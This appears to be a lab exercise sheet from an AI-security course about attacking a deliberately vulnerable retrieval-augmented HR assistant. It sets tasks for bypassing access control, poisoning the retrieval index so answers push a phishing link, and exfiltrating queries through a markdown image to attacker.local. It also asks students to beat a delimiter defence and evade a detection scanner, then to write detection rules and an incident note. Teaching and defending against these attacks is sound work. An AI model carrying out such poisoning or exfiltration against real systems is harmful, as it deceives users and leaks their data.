# Lab 03: Breaking RAG

Tutorial: [Module 03](../../tutorials/03-rag-attacks.md)

**Target:** `rag_app.py`, an ACME HR/IT assistant over a 5-document handbook. Anyone can
add pages through the "wiki" (`ingest`).

```bash
python rag_app.py list
python rag_app.py --mock ask "How do I reset my VPN password?"
```

## Tasks

1. **Broken access control.** As a normal employee, get the assistant to reveal
   the `hr:confidential` document. Why does the retriever allow this? Sketch the fix
   (metadata filter by user role at query time).

2. **Retrieval hijack.** Write a document that outranks the real VPN doc for
   "How do I reset my VPN password?". Check with:
   ```bash
   python rag_app.py retrieve "How do I reset my VPN password?"
   ```
   What happens if you just repeat the question several times? What about synonyms?

3. **Answer control + exfiltration.** Make the answer send users to your phishing link
   and include a markdown image to `http://attacker.local/log?q=...`.
   `poison_example.txt` is a spoiler if you get stuck.
   ```bash
   python rag_app.py ingest my_poison.txt --source wiki:anon-edit
   ```

4. **Collateral damage.** Ask unrelated questions ("how much vacation do I get?").
   Is your poison retrieved anyway? Why? (Hint: stop-words like "how", "do", "I".)

5. **Defense test.** Rerun with `--defense delimit` 20 times and compare ASR. Then try to
   beat the delimiter (e.g. close the `</doc>` tag inside your document).

## Hunt

```bash
python hunt_rag.py
```

- Did the corpus scan flag your poison? Which indicator fired?
- Make a stealthier poison that evades every rule while still working. Then write a
  rule that catches it.
- Using section 3 of the output, write the incident note: which users received the
  phishing link, and which document and source caused it.

Reset everything with `python rag_app.py reset && rm ../logs/lab03*.jsonl`.
